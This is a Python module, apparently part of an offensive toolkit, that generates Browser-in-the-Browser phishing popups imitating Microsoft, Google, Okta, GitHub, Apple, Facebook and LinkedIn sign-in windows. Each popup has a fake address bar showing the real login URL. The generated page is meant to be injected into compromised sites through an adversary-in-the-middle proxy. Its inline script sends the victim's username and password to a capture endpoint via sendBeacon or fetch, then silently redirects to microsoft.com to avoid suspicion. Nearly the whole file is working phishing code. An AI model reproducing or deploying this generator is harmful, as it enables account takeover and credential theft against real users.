"""
attack/bitb/generator.py — Générateur de popups BitB
=====================================================

Produit du HTML/CSS/JS qui imite à la perfection une popup de login
SSO Microsoft, Google, Okta, etc. Le résultat est conçu pour être
injecté dans une page compromise via le proxy Vantablack.

Pour chaque cible supportée, on définit :
- Le branding (logo, couleurs, polices)
- Le "look and feel" des inputs (form, placeholders, focus)
- Le "fake URL" affiché dans la barre d'adresse de la popup
- Le endpoint de capture (callback vers le proxy AiTM)

Architecture : on sépare strictement les templates (purement
esthétique) de la logique d'injection (qui capture et où).

Ressources publiques pour les assets (logos, polices) :
- Logos : copier localement dans `attack/bitb/assets/logos/`
- Polices : utiliser system-ui / Segoe UI (Microsoft) / Roboto (Google)
"""

from __future__ import annotations

import html
import json
import secrets
from dataclasses import dataclass, field
from enum import Enum
from typing import Dict, List, Optional


class BitBTarget(str, Enum):
    """Cibles SSO supportées par BitB."""

    MICROSOFT = "microsoft"
    GOOGLE = "google"
    OKTA = "okta"
    GITHUB = "github"
    APPLE = "apple"
    FACEBOOK = "facebook"
    LINKEDIN = "linkedin"


# ---------------------------------------------------------------------- #
# Templates CSS : branding par cible
# ---------------------------------------------------------------------- #

_TEMPLATES: dict[BitBTarget, dict[str, str]] = {
    BitBTarget.MICROSOFT: {
        "name": "Microsoft",
        "primary_color": "#0078d4",
        "background": "#ffffff",
        "text_color": "#1f1f1f",
        "font_family": "'Segoe UI', system-ui, sans-serif",
        "logo_svg": """
        <svg viewBox='0 0 23 23' xmlns='http://www.w3.org/2000/svg'>
          <rect width='10' height='10' fill='#f25022'/>
          <rect x='12' width='10' height='10' fill='#7fba00'/>
          <rect y='12' width='10' height='10' fill='#00a4ef'/>
          <rect x='12' y='12' width='10' height='10' fill='#ffb900'/>
        </svg>
        """,
        "title": "Sign in to your account",
        "subtitle": "to continue to Microsoft 365",
        "username_placeholder": "Email, phone, or Skype",
        "submit_text": "Next",
        "fake_url": "https://login.microsoftonline.com/common/oauth2/authorize",
    },
    BitBTarget.GOOGLE: {
        "name": "Google",
        "primary_color": "#1a73e8",
        "background": "#ffffff",
        "text_color": "#202124",
        "font_family": "'Google Sans', Roboto, Arial, sans-serif",
        "logo_svg": """
        <svg viewBox='0 0 48 48' xmlns='http://www.w3.org/2000/svg'>
          <path fill='#4285F4' d='M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z'/>
          <path fill='#34A853' d='M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z'/>
          <path fill='#FBBC05' d='M11.69 28.18c-.44-1.32-.69-2.73-.69-4.18s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24s.85 6.91 2.34 9.88l7.35-5.7z'/>
          <path fill='#EA4335' d='M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z'/>
        </svg>
        """,
        "title": "Sign in",
        "subtitle": "to continue to Google Workspace",
        "username_placeholder": "Email or phone",
        "submit_text": "Next",
        "fake_url": "https://accounts.google.com/o/oauth2/auth",
    },
    BitBTarget.OKTA: {
        "name": "Okta",
        "primary_color": "#007dc1",
        "background": "#ffffff",
        "text_color": "#1d1d1d",
        "font_family": "'Avenir Next', 'Helvetica Neue', sans-serif",
        "logo_svg": """
        <svg viewBox='0 0 32 32' xmlns='http://www.w3.org/2000/svg'>
          <circle cx='16' cy='16' r='14' fill='none' stroke='#007dc1' stroke-width='4'/>
          <circle cx='16' cy='16' r='6' fill='#007dc1'/>
        </svg>
        """,
        "title": "Sign In",
        "subtitle": "to continue to your application",
        "username_placeholder": "Username",
        "submit_text": "Next",
        "fake_url": "https://company.okta.com/oauth2/v1/authorize",
    },
    BitBTarget.GITHUB: {
        "name": "GitHub",
        "primary_color": "#24292f",
        "background": "#ffffff",
        "text_color": "#1f2328",
        "font_family": "-apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif",
        "logo_svg": """
        <svg viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg' fill='#24292f'>
          <path d='M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0 0 24 12c0-6.63-5.37-12-12-12z'/>
        </svg>
        """,
        "title": "Sign in to GitHub",
        "subtitle": "to continue to your repository",
        "username_placeholder": "Username or email address",
        "submit_text": "Sign in",
        "fake_url": "https://github.com/login/oauth/authorize",
    },
    BitBTarget.APPLE: {
        "name": "Apple",
        "primary_color": "#000000",
        "background": "#ffffff",
        "text_color": "#1d1d1f",
        "font_family": "-apple-system, BlinkMacSystemFont, sans-serif",
        "logo_svg": """
        <svg viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg' fill='#000'>
          <path d='M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09l.01-.01zM12 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z'/>
        </svg>
        """,
        "title": "Sign in with Apple",
        "subtitle": "to continue to your account",
        "username_placeholder": "Email or Phone Number",
        "submit_text": "Continue",
        "fake_url": "https://appleid.apple.com/auth/authorize",
    },
    BitBTarget.FACEBOOK: {
        "name": "Facebook",
        "primary_color": "#1877f2",
        "background": "#ffffff",
        "text_color": "#1c1e21",
        "font_family": "Helvetica, Arial, sans-serif",
        "logo_svg": """
        <svg viewBox='0 0 36 36' xmlns='http://www.w3.org/2000/svg'>
          <circle cx='18' cy='18' r='18' fill='#1877f2'/>
          <path fill='#fff' d='M20.18 18.94h2.81l.41-3.5h-3.22v-2.21c0-1.01.27-1.69 1.7-1.69h1.82V8.4c-.31-.04-1.4-.14-2.66-.14-2.63 0-4.43 1.6-4.43 4.55v2.63h-2.98v3.5h2.98v9.21h3.57v-9.21z'/>
        </svg>
        """,
        "title": "Log into Facebook",
        "subtitle": "to continue",
        "username_placeholder": "Email address or phone number",
        "submit_text": "Log In",
        "fake_url": "https://www.facebook.com/v18.0/dialog/oauth",
    },
    BitBTarget.LINKEDIN: {
        "name": "LinkedIn",
        "primary_color": "#0a66c2",
        "background": "#ffffff",
        "text_color": "#000000",
        "font_family": "-apple-system, system-ui, sans-serif",
        "logo_svg": """
        <svg viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg' fill='#0a66c2'>
          <path d='M20.5 2h-17A1.5 1.5 0 0 0 2 3.5v17A1.5 1.5 0 0 0 3.5 22h17a1.5 1.5 0 0 0 1.5-1.5v-17A1.5 1.5 0 0 0 20.5 2zM8 19H5v-9h3zM6.5 8.25A1.75 1.75 0 1 1 8.3 6.5a1.78 1.78 0 0 1-1.8 1.75zM19 19h-3v-4.74c0-1.42-.6-1.93-1.38-1.93A1.74 1.74 0 0 0 13 14.19a.66.66 0 0 0 0 .14V19h-3v-9h2.9v1.3a3.11 3.11 0 0 1 2.7-1.4c1.55 0 3.36.86 3.36 3.66z'/>
        </svg>
        """,
        "title": "Sign in to LinkedIn",
        "subtitle": "to continue",
        "username_placeholder": "Email or phone",
        "submit_text": "Continue",
        "fake_url": "https://www.linkedin.com/oauth/v2/authorization",
    },
}


@dataclass
class BitBInjector:
    """
    Générateur principal d'une popup BitB.

    Attributs :
        target          : marque à imiter (BitBTarget enum)
        capture_endpoint: URL où envoyer les credentials capturés
        fake_url        : URL affichée dans la "barre d'adresse" de la popup
        campaign_id     : identifiant de la campagne (pour le tracking)
        extra_branding  : dict optionnel pour override (logo_path, etc.)
    """

    target: BitBTarget = BitBTarget.MICROSOFT
    capture_endpoint: str = "/_/bitb/capture"
    fake_url: str | None = None
    campaign_id: str = field(default_factory=lambda: secrets.token_hex(8))
    extra_branding: dict = field(default_factory=dict)

    def generate_popup_html(
        self,
        fake_url: str | None = None,
        parent_origin: str | None = None,
    ) -> str:
        """
        Retourne le HTML complet (CSS + JS inline) de la popup BitB.

        Le HTML est conçu pour être injecté dans une page compromise
        via `engine/advanced_proxy.py` (middleware `inject_session_stealer`)
        ou via le hook d'injection de la CLI.
        """
        cfg = _TEMPLATES[self.target]
        url = fake_url or self.fake_url or cfg["fake_url"]
        if parent_origin:
            cfg = dict(cfg)
            cfg["parent_origin"] = parent_origin
        # S'échapper pour l'injection dans le HTML
        safe_url = html.escape(url, quote=True)
        safe_endpoint = html.escape(self.capture_endpoint, quote=True)
        safe_cid = html.escape(self.campaign_id, quote=True)
        safe_name = html.escape(cfg["name"], quote=True)

        # Template inline (volontairement non-minifié pour être lisible
        # par un analyste Blue Team qui ferait de l'inspection)
        return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>{safe_name} — Sign in</title>
<style>
  /* ---------- Layout & overlay ---------- */
  .bitb-overlay {{
    position: fixed; inset: 0; background: rgba(0,0,0,0.45);
    z-index: 999999; display: flex; align-items: center;
    justify-content: center; font-family: {cfg['font_family']};
  }}
  .bitb-window {{
    background: {cfg['background']}; color: {cfg['text_color']};
    width: 440px; max-width: 96vw; max-height: 92vh;
    border-radius: 8px; box-shadow: 0 12px 40px rgba(0,0,0,0.35);
    overflow: hidden; display: flex; flex-direction: column;
  }}
  .bitb-titlebar {{
    background: #f3f3f3; padding: 8px 14px; display: flex;
    align-items: center; gap: 8px; border-bottom: 1px solid #e1e1e1;
    -webkit-user-select: none; user-select: none;
  }}
  .bitb-dots {{ display: flex; gap: 6px; }}
  .bitb-dots span {{ width: 12px; height: 12px; border-radius: 50%; }}
  .bitb-dots .close {{ background: #ff5f57; }}
  .bitb-dots .min   {{ background: #ffbd2e; }}
  .bitb-dots .max   {{ background: #28c840; }}
  .bitb-urlbar {{
    flex: 1; background: #fff; border: 1px solid #d1d1d1; border-radius: 4px;
    padding: 4px 10px; font-size: 12px; color: #555;
    overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
  }}
  .bitb-content {{ padding: 28px 32px; }}
  .bitb-logo {{ width: 32px; height: 32px; margin-bottom: 16px; }}
  .bitb-h1 {{ font-size: 24px; font-weight: 600; margin: 0 0 8px; }}
  .bitb-sub {{ font-size: 14px; color: #555; margin: 0 0 24px; }}
  .bitb-input {{
    width: 100%; padding: 10px 12px; font-size: 14px;
    border: 1px solid #888; border-radius: 4px; margin-bottom: 16px;
    box-sizing: border-box;
  }}
  .bitb-input:focus {{ outline: 2px solid {cfg['primary_color']}; border-color: {cfg['primary_color']}; }}
  .bitb-submit {{
    width: 100%; padding: 10px; font-size: 14px; font-weight: 600;
    background: {cfg['primary_color']}; color: #fff; border: none;
    border-radius: 4px; cursor: pointer;
  }}
  .bitb-submit:hover {{ filter: brightness(1.1); }}
  .bitb-footer {{ font-size: 12px; color: #888; text-align: center; padding: 12px; }}
</style>
</head>
<body>
<div class="bitb-overlay" id="bitb-overlay">
  <div class="bitb-window" role="dialog" aria-modal="true">
    <div class="bitb-titlebar">
      <div class="bitb-dots">
        <span class="close"></span><span class="min"></span><span class="max"></span>
      </div>
      <div class="bitb-urlbar" title="{safe_url}">{safe_url}</div>
    </div>
    <div class="bitb-content">
      <div class="bitb-logo">{cfg['logo_svg']}</div>
      <h1 class="bitb-h1">{html.escape(cfg['title'])}</h1>
      <p class="bitb-sub">{html.escape(cfg['subtitle'])}</p>
      <form id="bitb-form" autocomplete="off">
        <input type="text"     class="bitb-input" id="bitb-user" placeholder="{html.escape(cfg['username_placeholder'])}" required>
        <input type="password" class="bitb-input" id="bitb-pass" placeholder="Password" style="display:none">
        <button type="submit" class="bitb-submit">{html.escape(cfg['submit_text'])}</button>
      </form>
    </div>
    <div class="bitb-footer">© 2026 {safe_name}</div>
  </div>
</div>
<script>
  // BitB Capture Logic
  (function() {{
    const ENDPOINT  = "{safe_endpoint}";
    const CAMPAIGN  = "{safe_cid}";
    const TARGET    = "{self.target.value}";

    function exfil(stage, payload) {{
      try {{
        const body = JSON.stringify(Object.assign({{
          campaign: CAMPAIGN, target: TARGET, stage: stage,
          ts: new Date().toISOString(),
          ua: navigator.userAgent, href: location.href,
        }}, payload));
        // Envoi via sendBeacon (résiste à la fermeture de la page) ou fallback
        if (navigator.sendBeacon) {{
          navigator.sendBeacon(ENDPOINT, body);
        }} else {{
          fetch(ENDPOINT, {{method: 'POST', body: body, headers: {{'Content-Type':'application/json'}}, keepalive: true}});
        }}
      }} catch (e) {{ /* noop */ }}
    }}

    // Affiche le champ password après le username
    const userInput = document.getElementById('bitb-user');
    const passInput = document.getElementById('bitb-pass');
    const form      = document.getElementById('bitb-form');

    userInput.addEventListener('input', () => {{
      if (userInput.value.includes('@') || userInput.value.length > 5) {{
        passInput.style.display = 'block';
        passInput.focus();
      }}
    }});

    form.addEventListener('submit', (e) => {{
      e.preventDefault();
      exfil('credentials', {{
        username: userInput.value,
        password: passInput.value || null
      }});
      // Redirection vers une page "Loading…" qui simule la vérification
      document.body.innerHTML = '<div style="font-family:sans-serif;padding:60px;text-align:center;color:#555">Verifying…</div>';
      setTimeout(() => {{
        // Redirection silencieuse (vers une page légitime pour ne pas éveiller les soupçons)
        location.href = 'https://www.microsoft.com/';
      }}, 2200);
    }});
  }})();
</script>
</body>
</html>"""


# ---------------------------------------------------------------------- #
# Helpers
# ---------------------------------------------------------------------- #

def list_targets() -> list[str]:
    """Retourne la liste des cibles supportées."""
    return [t.value for t in BitBTarget]


def generate_bitb_popup(
    target: str = "microsoft",
    capture_endpoint: str = "/_/bitb/capture",
    fake_url: str | None = None,
) -> str:
    """
    Helper fonctionnel : génère le HTML d'une popup BitB pour la cible donnée.
    """
    try:
        tgt = BitBTarget(target.lower())
    except ValueError:
        raise ValueError(f"Cible non supportée. Disponibles : {list_targets()}")
    inj = BitBInjector(
        target=tgt,
        capture_endpoint=capture_endpoint,
        fake_url=fake_url,
    )
    return inj.generate_popup_html()
